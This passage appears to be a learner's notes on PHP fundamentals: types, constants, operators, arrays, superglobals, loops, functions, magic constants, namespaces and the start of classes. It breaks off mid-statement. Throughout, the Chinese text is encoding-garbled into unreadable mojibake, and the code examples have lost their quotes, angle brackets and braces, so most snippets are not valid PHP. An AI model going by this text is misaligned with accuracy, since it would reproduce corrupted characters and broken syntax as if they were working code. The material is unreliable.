ç”±äºèµ„æºç±»å‹å˜é‡ä¿å­˜æœ‰ä¸ºæ‰“å¼€æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€å›¾å½¢ç”»å¸ƒåŒºåŸŸç­‰çš„ç‰¹æ®Šå¥æŸ„ï¼Œå› æ­¤å°†å…¶å®ƒç±»å‹çš„å€¼è½¬æ¢ä¸ºèµ„æºæ²¡æœ‰æ„ä¹‰ã€‚ ä½¿ç”¨ get_resource_type() å‡½æ•°å¯ä»¥è¿”å›èµ„æºï¼ˆresourceï¼‰ç±»å‹ phpç±»å‹æ¯”è¾ƒæ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªæ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å·æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ phpå¸¸é‡ä¸€ä¸ªå¸¸é‡ç”±è‹±æ–‡å­—æ¯ã€ä¸‹åˆ’çº¿ã€å’Œæ•°å­—ç»„æˆ,ä½†æ•°å­—ä¸èƒ½ä½œä¸ºé¦–å­—æ¯å‡ºç°ã€‚ (å¸¸é‡åä¸éœ€è¦åŠ  $ ä¿®é¥°ç¬¦)ã€‚ æ³¨æ„ï¼šå¸¸é‡åœ¨æ•´ä¸ªè„šæœ¬ä¸­éƒ½å¯ä»¥ä½¿ç”¨ è®¾ç½®å¸¸é‡ï¼Œä½¿ç”¨define()å‡½æ•°ï¼šbool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) ä¾‹å­ï¼šdefine(GREETING,æ¬¢è¿æ¥åˆ°è¿™é‡Œ,false)(falseå¯ä»¥çœç•¥) è¯¥å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°: nameï¼šå¿…é€‰å‚æ•°ï¼Œå¸¸é‡åç§°ï¼Œå³æ ‡å¿—ç¬¦ã€‚ valueï¼šå¿…é€‰å‚æ•°ï¼Œå¸¸é‡çš„å€¼ã€‚ case_insensitive ï¼šå¯é€‰å‚æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º TRUEï¼Œè¯¥å¸¸é‡åˆ™å¤§å°å†™ä¸æ•æ„Ÿï¼Œé»˜è®¤æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ æ³¨æ„ï¼šè‡ª PHP 7.3.0 å¼€å§‹ï¼Œå®šä¹‰ä¸åŒºåˆ†å¤§å°å†™çš„å¸¸é‡å·²è¢«å¼ƒç”¨ã€‚ä» PHP 8.0.0 å¼€å§‹ï¼Œåªæœ‰ false æ˜¯å¯æ¥å—çš„å€¼ï¼Œä¼ é€’ true å°†äº§ç”Ÿä¸€ä¸ªè­¦å‘Šã€‚ phpå­—ç¬¦ä¸²å˜é‡phpä¸­åªæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²è¿ç®—ç¬¦ï¼Œé‚£å°±æ˜¯***å¹¶ç½®è¿ç®—ç¬¦(.)***ï¼šæŠŠä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ ä¾‹å­ï¼š ?php$txt1=Hello world!;$txt2=What a nice day!;echo $txt1 . . $txt2;?//ä¾‹å­ä¸­ç”¨äº†ä¸¤ä¸ªå¹¶ç½®è¿ç®—ç¬¦ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­é—´åŠ äº†ä¸€ä¸ªç©ºæ ¼ php strlen()å‡½æ•° è¯¥å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ strlen() å¸¸å¸¸ç”¨åœ¨å¾ªç¯å’Œå…¶ä»–å‡½æ•°ä¸­ï¼Œå› ä¸ºé‚£æ—¶ç¡®å®šå­—ç¬¦ä¸²ä½•æ—¶ç»“æŸæ˜¯å¾ˆé‡è¦çš„ã€‚ï¼ˆä¾‹å¦‚ï¼Œåœ¨å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¹‹åç»“æŸå¾ªç¯ã€‚ï¼‰ php strpos()å‡½æ•° è¯¥å‡½æ•°ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ä¸€ä¸ªå­—æˆ–ä¸€ä¸ªæŒ‡å®šçš„æ–‡æœ¬ã€‚ å¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°åŒ¹é…ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä½ç½®ã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è¿”å› FALSE ?phpecho strpos(Hello world!,world);? phpè¿ç®—ç¬¦phpç®—æœ¯è¿ç®—ç¬¦ è¿˜æœ‰ä¸€ä¸ªè¿ç®—ç¬¦ï¼š**intdiv()**ï¼Œè¯¥å‡½æ•°è¿”å›å€¼ä¸ºç¬¬ä¸€ä¸ªå‚æ•°é™¤äºç¬¬äºŒä¸ªå‚æ•°çš„å€¼å¹¶å‘ä¸‹å–æ•´ ?php var_dump(intdiv(10, 3)); ? phpèµ‹å€¼è¿ç®—ç¬¦ â€œâ€; â€œ+â€; â€œ-â€; â€œ*â€; â€œâ€; â€œ%â€; â€œ.â€(ä¾‹å­ï¼ša.bå³aa.b) phpé€’å¢é€’å‡è¿ç®—ç¬¦ ++x ; x++ ; â€“x ; xâ€“ phpæ¯”è¾ƒè¿ç®—ç¬¦ phpé€»è¾‘è¿ç®—ç¬¦ phpæ•°ç»„è¿ç®—ç¬¦ ä¸‰å…ƒè¿ç®—ç¬¦ å³ï¼Ÿï¼šï¼ˆè·Ÿcè¯­è¨€çš„ä¸‰å…ƒè¿ç®—ç¬¦ç”¨æ³•ä¸€è‡´ï¼‰ NULL åˆå¹¶è¿ç®—ç¬¦ä¼šåˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ä¸”å€¼ä¸ä¸ºNULLï¼Œå¦‚æœæ˜¯ï¼Œå®ƒå°±ä¼šè¿”å›è‡ªèº«çš„å€¼ï¼Œå¦åˆ™è¿”å›å®ƒçš„ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚ $site = $_GET[site] ?? phpä¸­æ–‡ç½‘; ç»„åˆè¿ç®—ç¬¦ PHP7+ æ”¯æŒç»„åˆæ¯”è¾ƒç¬¦ï¼ˆcombined comparison operatorï¼‰ä¹Ÿç§°ä¹‹ä¸ºå¤ªç©ºèˆ¹æ“ä½œç¬¦ï¼Œç¬¦å·ä¸º ****ã€‚ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦å¯ä»¥è½»æ¾å®ç°ä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒï¼Œå½“ç„¶ä¸ä»…é™äºæ•°å€¼ç±»æ•°æ®çš„æ¯”è¾ƒã€‚ è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š $c = $a = $b; è§£æå¦‚ä¸‹ï¼š å¦‚æœ $a $b, åˆ™ $c çš„å€¼ä¸º 1ã€‚ å¦‚æœ $a $b, åˆ™ $c çš„å€¼ä¸º 0ã€‚ å¦‚æœ $a $b, åˆ™ $c çš„å€¼ä¸º -1ã€‚ ifâ€¦elseâ€¦ï¼›switchéƒ½ä¸Cè¯­è¨€ä¸­çš„ç”¨æ³•ä¸€è‡´ phpæ•°ç»„ç”¨array( )å‡½æ•°æ¥åˆ›å»ºæ•°ç»„ ä¸‰ç§æ•°ç»„ï¼šæ•°å€¼æ•°ç»„ - å¸¦æœ‰æ•°å­— ID é”®çš„æ•°ç»„ï¼›å…³è”æ•°ç»„ - å¸¦æœ‰æŒ‡å®šçš„é”®çš„æ•°ç»„ï¼Œæ¯ä¸ªé”®å…³è”ä¸€ä¸ªå€¼ï¼›å¤šç»´æ•°ç»„ - åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ•°ç»„ phpæ•°å€¼æ•°ç»„ ä¸¤ç§æ–¹æ³•ï¼šè‡ªåŠ¨åˆ†é…IDé”®ï¼ˆæ€»æ˜¯ä»0å¼€å§‹ï¼‰ï¼›äººå·¥åˆ†é…IDé”®ï¼š$cars[0]=Volvo; count( )å‡½æ•° ç”¨äºè·å–æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ çš„æ•°é‡ï¼‰ éå†æ•°å€¼æ•°ç»„ ?php$cars=array(Volvo,BMW,Toyota);$arrlength=count($cars);for($x=0;$x$arrlength;$x++) echo $cars[$x]; echo br;? phpå…³è”æ•°ç»„ å…³è”æ•°ç»„æ˜¯ä½¿ç”¨åˆ†é…ç»™æ•°ç»„çš„æŒ‡å®šçš„é”®çš„æ•°ç»„ ä¸¤ç§æ–¹æ³• $age=array(Peter=35,Ben=37,Joe=43);or:$age[Peter]=35;$age[Ben]=37;$age[Joe]=43; å¦‚ä½•ä½¿ç”¨ ?php$age=array(Peter=35,Ben=37,Joe=43);echo Peter is . $age[Peter] . years old.;? éå†å…³è”æ•°ç»„ ä½¿ç”¨foreachå¾ªç¯ ?php$age=array(Peter=35,Ben=37,Joe=43);foreach($age as $x=$x_value) echo Key= . $x . , Value= . $x_value; echo br;? phpæ•°ç»„æ’åºsort( ) å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰ç…§å­—æ¯å‡åºæ’åˆ— ?php$cars=array(Volvo,BWM,Toyota);sort($cars);print_r($cars);? å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰ç…§æ•°å­—å‡åºæ’åˆ— rsort( ) å¯¹æ•°ç»„ä¸­çš„å…ƒç´ è¿›è¡Œå­—æ¯é™åºæ’åˆ— å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰ç…§æ•°å­—é™åºæ’åˆ— å’Œä¸Šé¢sort( )ç”¨æ³•ä¸€è‡´ asort( ) æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— ?php$age=array(Peter=35,Ben=37,Joe=43); asort($age); print_r($age); ? ksort( ) æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— ?php$age=array(Peter=35,Ben=37,Joe=43);ksort($age);print_r($age);? arsort( ) æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œé™åºæ’åˆ— è·Ÿä¸Šé¢ç”¨æ³•ä¸€è‡´ krsort( ) æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ— phpè¶…çº§å˜é‡phpè¶…çº§å…¨å±€å˜é‡åˆ—è¡¨ï¼š$GLOBALSï¼›$_SERVERï¼›$_REQUESTï¼›$_POSTï¼›$_GETï¼›$_FILESï¼›$_ENVï¼›$_COOKIEï¼›$_SESSION php $GLOBALS $GLOBALS æ˜¯ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”® ?php $x = 75; $y = 25;function addition() $GLOBALS[z] = $GLOBALS[x] + $GLOBALS[y]; addition(); echo $z; php $_SERVER $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›æ²¡æœ‰åœ¨è¿™é‡Œåˆ—ä¸¾å‡ºæ¥çš„é¡¹ç›®ã€‚ å®æ“ï¼šåœ¨æœ¬åœ°PHPæ–‡ä»¶ä¸­è¾“å…¥ä¸€ä¸‹ä»£ç ï¼Œåˆ—å‡º$_SERVERçš„å†…å®¹ â€‹ è®¿é—®è¯¥PHPé¡µé¢ï¼Œæ˜¾ç¤ºå‡º$_SERVERçš„å…¨éƒ¨å†…å®¹ ?php echo pre;print_r($_SERVER);? $_SERVERä¸­æ‰€æœ‰çš„é‡è¦å…ƒç´  php _REQUEST PHP $REQUEST ç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ®ã€‚ ä»¥ä¸‹å®ä¾‹æ˜¾ç¤ºäº†ä¸€ä¸ªè¾“å…¥å­—æ®µï¼ˆinputï¼‰åŠæäº¤æŒ‰é’®(submit)çš„è¡¨å•(form)ã€‚ å½“ç”¨æˆ·é€šè¿‡ç‚¹å‡» â€œSubmitâ€ æŒ‰é’®æäº¤è¡¨å•æ•°æ®æ—¶, è¡¨å•æ•°æ®å°†å‘é€è‡³æ ‡ç­¾ä¸­ action å±æ€§ä¸­æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œæˆ‘ä»¬æŒ‡å®šæ–‡ä»¶æ¥å¤„ç†è¡¨å•æ•°æ®ã€‚å¦‚æœä½ å¸Œæœ›å…¶ä»–çš„PHPæ–‡ä»¶æ¥å¤„ç†è¯¥æ•°æ®ï¼Œä½ å¯ä»¥ä¿®æ”¹è¯¥æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶åã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¶…çº§å…¨å±€å˜é‡ $_REQUEST æ¥æ”¶é›†è¡¨å•ä¸­çš„ input å­—æ®µæ•°æ®: htmlbodyform method=post action=?php echo $_SERVER[PHP_SELF];?Name: input type=text name=fnameinput type=submit/form?php$name = $_REQUEST[fname];echo $name;?/body/html php $_POST è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨html formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼šmethodâ€postâ€ php $_GET PHP $_GET åŒæ ·è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼šâ€methodâ€getâ€ã€‚ $_GET ä¹Ÿå¯ä»¥æ”¶é›†URLä¸­å‘é€çš„æ•°æ® whileå¾ªç¯è·ŸCè¯­è¨€ä¸­çš„whilleå¾ªç¯ç”¨æ³•ä¸€è‡´ forå¾ªç¯ç”¨æ³•ä¸Cè¯­è¨€ä¸­çš„ä¸€è‡´ foreachå¾ªç¯ å’Œä¸Šæ–‡æ‰€è¯´ä½œç”¨ä¸€æ ·ï¼Œç”¨æ¥éå†æ•°ç»„ æ¯è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ $value å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œæ‚¨å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå€¼ã€‚ foreach ($array as $value) è¦æ‰§è¡Œä»£ç ; ?php$x=array(Google,Runoob,Taobao);foreach($x as $value) echo $value .PHP_EOL;? æ¯ä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®ä¸å€¼å°±éƒ½ä¼šè¢«èµ‹å€¼ç»™ $key å’Œ $value å˜é‡ï¼ˆæ•°å­—æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œä½ å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªé”®ä¸å€¼ã€‚ foreach ($array as $key = $value) è¦æ‰§è¡Œä»£ç ; ?php$x=array(1=Google,2=Runoob,3=Taobao);foreach($x as $key = $value) echo key ä¸º.$key.,å¯¹åº”çš„valueä¸º.$value.PHP_EOL;? phpå‡½æ•°åˆ›å»ºè¯­æ³• ?phpfunction functionName() // è¦æ‰§è¡Œçš„ä»£ç ? å‡½æ•°å‡†åˆ™ï¼šå‡½æ•°åç§°åº”è¯¥æ˜¾ç¤ºå‡ºå®ƒçš„åŠŸèƒ½ï¼›å‡½æ•°åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼‰ æ·»åŠ å‡½æ•° å‚æ•°å°±åœ¨å‡½æ•°åç§°åé¢çš„ä¸€ä¸ªæ‹¬å·å†…æŒ‡å®š ?phpfunction writeName($fname) echo $fname . Refsnes.br;echo My name is ;writeName(Kai Jim);echo My sisters name is ;writeName(Hege);echo My brothers name is ;writeName(Stale);? è¿”å›å€¼ è®©å‡½æ•°è¿”å›ä¸€ä¸ªå€¼ï¼Œç”¨returnè¯­å¥ ?phpfunction add($x,$y) $total=$x+$y; return $total;echo 1 + 16 = . add(1,16);? phpé­”æœ¯å¸¸é‡è¿™å…«ä¸ªé­”æœ¯å¸¸é‡ä¸åŒºåˆ†å¤§å°å†™ LINE æ–‡ä»¶ä¸­çš„å½“å‰è¡Œå· LINEæ—è¾¹æ˜¯ä¸¤æ¡ä¸‹åˆ’çº¿ ?phpecho è¿™æ˜¯ç¬¬ . __LINE__ . è¡Œ;? FILE æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚å¦‚æœç”¨åœ¨è¢«åŒ…å«æ–‡ä»¶ä¸­ï¼Œåˆ™è¿”å›è¢«åŒ…å«çš„æ–‡ä»¶å ç”¨æ³•å’Œä¸Šé¢ä¸€è‡´ï¼Œæ—è¾¹ä¹Ÿæ˜¯ä¸¤æ¡ä¸‹æ»‘çº¿ â€”â€”DIRâ€”â€” æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚å¦‚æœç”¨åœ¨è¢«åŒ…æ‹¬æ–‡ä»¶ä¸­ï¼Œåˆ™è¿”å›è¢«åŒ…æ‹¬çš„æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚å®ƒç­‰ä»·äº dirname(FILE)ã€‚é™¤éæ˜¯æ ¹ç›®å½•ï¼Œå¦åˆ™ç›®å½•ä¸­åä¸åŒ…æ‹¬æœ«å°¾çš„æ–œæ ã€‚ â€”â€”FUNCTIONâ€”â€” å‡½æ•°åç§°ï¼Œæœ¬å¸¸é‡è¿”å›è¯¥å‡½æ•°è¢«å®šä¹‰æ—¶çš„åå­—ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ ?phpfunction test() echo å‡½æ•°åä¸ºï¼š . __FUNCTION__ ;test();? â€”â€”CLASSâ€”â€” ç±»çš„åç§°ï¼ˆPHP 4.3.0 æ–°åŠ ï¼‰ã€‚è‡ª PHP 5 èµ·æœ¬å¸¸é‡è¿”å›è¯¥ç±»è¢«å®šä¹‰æ—¶çš„åå­—ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚åœ¨ PHP 4 ä¸­è¯¥å€¼æ€»æ˜¯å°å†™å­—æ¯çš„ã€‚ç±»ååŒ…æ‹¬å…¶è¢«å£°æ˜çš„ä½œç”¨åŒºåŸŸï¼ˆä¾‹å¦‚ Foo\\Barï¼‰ ?phpclass test function _print() echo ç±»åä¸ºï¼š . __CLASS__ . br; echo å‡½æ•°åä¸ºï¼š . __FUNCTION__ ; $t = new test();$t-_print();? â€”â€”TRAITâ€”â€” æ²¡çœ‹æ‡‚ï¼Œä¹‹åéœ€è¦è®¤çœŸå†ç†è§£ä¸€é â€”â€”METHODâ€”â€” ç±»çš„æ–¹æ³•åã€‚è¿”å›è¯¥æ–¹æ³•è¢«å®šä¹‰æ—¶çš„åå­— ?phpfunction test() echo å‡½æ•°åä¸ºï¼š . __METHOD__ ;test();? â€”â€”NAMESPACEâ€”â€” å½“å‰å‘½åç©ºé—´çš„åç§°ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚æ­¤å¸¸é‡æ˜¯åœ¨ç¼–è¯‘æ—¶å®šä¹‰çš„ ?phpnamespace MyProject; echo å‘½åç©ºé—´ä¸ºï¼š, __NAMESPACE__, ; // è¾“å‡º MyProject? phpå‘½åç©ºé—´********ç›®å‰ä¸è¦æ±‚æŒæ¡ï¼Œä¹‹åå†æ¥å­¦å§ ç›®çš„æ˜¯è§£å†³é‡åé—®é¢˜ï¼Œphpä¸å…è®¸ä¸¤ä¸ªå‡½æ•°æˆ–è€…ç±»å‡ºç°ç›¸åŒçš„åå­— PHP å‘½åç©ºé—´å¯ä»¥è§£å†³ä»¥ä¸‹ä¸¤ç±»é—®é¢˜ï¼š ç”¨æˆ·ç¼–å†™çš„ä»£ç ä¸PHPå†…éƒ¨çš„ç±»å‡½æ•°å¸¸é‡æˆ–ç¬¬ä¸‰æ–¹ç±»å‡½æ•°å¸¸é‡ä¹‹é—´çš„åå­—å†²çªã€‚ ä¸ºå¾ˆé•¿çš„æ ‡è¯†ç¬¦åç§°(é€šå¸¸æ˜¯ä¸ºäº†ç¼“è§£ç¬¬ä¸€ç±»é—®é¢˜è€Œå®šä¹‰çš„)åˆ›å»ºä¸€ä¸ªåˆ«åï¼ˆæˆ–ç®€çŸ­ï¼‰çš„åç§°ï¼Œæé«˜æºä»£ç çš„å¯è¯»æ€§ å®šä¹‰å‘½åç©ºé—´å¿…é¡»åœ¨æ‰€æœ‰ä»£ç ä¹‹å‰å£°æ˜å‘½åç©ºé—´ å¯ä»¥åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸åŒçš„å‘½åç©ºé—´ä»£ç ï¼Œå»ºè®®ä½¿ç”¨å¤§æ‹¬å· ?phpnamespace MyProject const CONNECT_OK = 1; class Connection /* ... */ function connect() /* ... */ namespace AnotherProject const CONNECT_OK = 1; class Connection /* ... */ function connect() /* ... */ ? å°†å…¨å±€çš„éå‘½åç©ºé—´ä¸­çš„ä»£ç ä¸å‘½åç©ºé—´ä¸­çš„ä»£ç ç»„åˆåœ¨ä¸€èµ·ï¼Œåªèƒ½ä½¿ç”¨å¤§æ‹¬å·å½¢å¼çš„è¯­æ³•ã€‚å…¨å±€ä»£ç å¿…é¡»ç”¨ä¸€ä¸ªä¸å¸¦åç§°çš„ namespace è¯­å¥åŠ ä¸Šå¤§æ‹¬å·æ‹¬èµ·æ¥ ?phpnamespace MyProject const CONNECT_OK = 1;class Connection /* ... */ function connect() /* ... */ namespace // å…¨å±€ä»£ç session_start();$a = MyProject\\connect();echo MyProject\\Connection::start();? åœ¨å£°æ˜å‘½åç©ºé—´ä¹‹å‰å”¯ä¸€åˆæ³•çš„ä»£ç æ˜¯ç”¨äºå®šä¹‰æºæ–‡ä»¶ç¼–ç æ–¹å¼çš„ declare è¯­å¥ declare(encoding=UTF-8); //å®šä¹‰å¤šä¸ªå‘½åç©ºé—´å’Œä¸åŒ…å«åœ¨å‘½åç©ºé—´ä¸­çš„ä»£ç  å­å‘½åç©ºé—´ä¸ç›®å½•å’Œæ–‡ä»¶çš„å…³ç³»å¾ˆåƒï¼ŒPHP å‘½åç©ºé—´ä¹Ÿå…è®¸æŒ‡å®šå±‚æ¬¡åŒ–çš„å‘½åç©ºé—´çš„åç§° namespace MyProject\\Sub\\Level; //å£°æ˜åˆ†å±‚æ¬¡çš„å•ä¸ªå‘½åç©ºé—´ å‘½åç©ºé—´çš„ä½¿ç”¨phpé¢å‘å¯¹è±¡å¯¹è±¡çš„ä¸»è¦ä¸‰ä¸ªç‰¹æ€§ï¼š å¯¹è±¡çš„è¡Œä¸ºï¼šå¯¹è±¡å¯ä»¥æ‰§è¡Œçš„æ“ä½œï¼Œæ¯”å¦‚ï¼šå¼€ç¯ï¼Œå…³ç¯å°±æ˜¯è¡Œä¸ºã€‚ å¯¹è±¡çš„å½¢æ€ï¼šå¯¹å¯¹è±¡ä¸åŒçš„è¡Œä¸ºæ˜¯å¦‚ä½•å“åº”çš„ï¼Œæ¯”å¦‚ï¼šé¢œè‰²ï¼Œå°ºå¯¸ï¼Œå¤–å‹ã€‚ å¯¹è±¡çš„è¡¨ç¤ºï¼šå¯¹è±¡çš„è¡¨ç¤ºå°±ç›¸å½“äºèº«ä»½è¯ï¼Œå…·ä½“åŒºåˆ†åœ¨ç›¸åŒçš„è¡Œä¸ºä¸çŠ¶æ€ä¸‹æœ‰ä»€ä¹ˆä¸åŒã€‚ æ¯”å¦‚ Animal(åŠ¨ç‰©) æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæˆ‘ä»¬å¯ä»¥å…·ä½“åˆ°ä¸€åªç‹—è·Ÿä¸€åªç¾Šï¼Œè€Œç‹—è·Ÿç¾Šå°±æ˜¯å…·ä½“çš„å¯¹è±¡ï¼Œä»–ä»¬æœ‰é¢œè‰²å±æ€§ï¼Œå¯ä»¥å†™ï¼Œå¯ä»¥è·‘ç­‰è¡Œä¸ºçŠ¶æ€ã€‚ é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸‰ä¸ªä¸»è¦ç‰¹æ€§ï¼š å°è£…ï¼ˆEncapsulationï¼‰ï¼šæŒ‡å°†å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å°è£…åœ¨ä¸€èµ·ï¼Œä½¿å¾—å¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—®å’Œä¿®æ”¹å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ã€‚é€šè¿‡ä½¿ç”¨è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ï¼ˆpublicã€privateã€protectedï¼‰æ¥é™åˆ¶å±æ€§å’Œæ–¹æ³•çš„è®¿é—®æƒé™ï¼Œä»è€Œå®ç°å°è£…ã€‚ ç»§æ‰¿ï¼ˆInheritanceï¼‰ï¼šæŒ‡å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œè¯¥ç±»ç»§æ‰¿äº†çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥æ·»åŠ è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•ã€‚é€šè¿‡ç»§æ‰¿ï¼Œå¯ä»¥é¿å…é‡å¤ç¼–å†™ç›¸ä¼¼çš„ä»£ç ï¼Œå¹¶ä¸”å¯ä»¥å®ç°ä»£ç çš„é‡ç”¨ã€‚ å¤šæ€ï¼ˆPolymorphismï¼‰ï¼šæŒ‡å¯ä»¥ä½¿ç”¨ä¸€ä¸ªçˆ¶ç±»ç±»å‹çš„å˜é‡æ¥å¼•ç”¨ä¸åŒå­ç±»ç±»å‹çš„å¯¹è±¡ï¼Œä»è€Œå®ç°å¯¹ä¸åŒå¯¹è±¡çš„ç»Ÿä¸€æ“ä½œã€‚å¤šæ€å¯ä»¥ä½¿å¾—ä»£ç æ›´åŠ çµæ´»ï¼Œå…·æœ‰æ›´å¥½çš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚åœ¨ PHP ä¸­ï¼Œå¤šæ€å¯ä»¥é€šè¿‡å®ç°æ¥å£ï¼ˆinterfaceï¼‰å’Œä½¿ç”¨æŠ½è±¡ç±»ï¼ˆabstract classï¼‰æ¥å®ç°ã€‚ phpç±»å®šä¹‰è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š ?phpclass phpClass var $var1; var $var2 = constant string; function myfunc ($arg1, $arg2) [..] [..]? å…¶ä¸­ varç›¸å½“äºæ˜¯ publicçš„åˆ«åï¼›å‡½æ•°å®šä¹‰ç±»ä¼¼ PHP å‡½æ•°çš„å®šä¹‰ï¼Œä½†å‡½æ•°åªèƒ½é€šè¿‡è¯¥ç±»åŠå…¶å®ä¾‹åŒ–çš„å¯¹è±¡è®¿é—® phpä¸­åˆ›å»ºå¯¹è±¡åˆ›å»ºå®Œç±»åï¼Œå¯ä»¥ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡ $runoob=new Site; è°ƒç”¨æˆå‘˜æ–¹æ³•åœ¨å®ä¾‹åŒ–å¯¹è±¡åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡è°ƒç”¨æˆå‘˜æ–¹æ³•ï¼Œè¯¥å¯¹è±¡çš„æˆå‘˜æ–¹æ³•åªèƒ½æ“ä½œè¯¥å¯¹è±¡çš„æˆå‘˜å˜é‡ ä»¥ä¸‹ä¸ºä¸Šè¿°ä¸‰ç§çš„å®Œæ•´ä»£ç ä¾‹å­ï¼š ?phpclass Site //æˆå‘˜å˜é‡ var $url; var $title; //æˆå‘˜å‡½æ•° function setUrl($par) $this-url=$par; function getUrl() echo $this-url .PHP_EOL; function setTitle($par) $this-title=$par; function getTitle() echo $this-title.PHP_EOL; $runoob=new 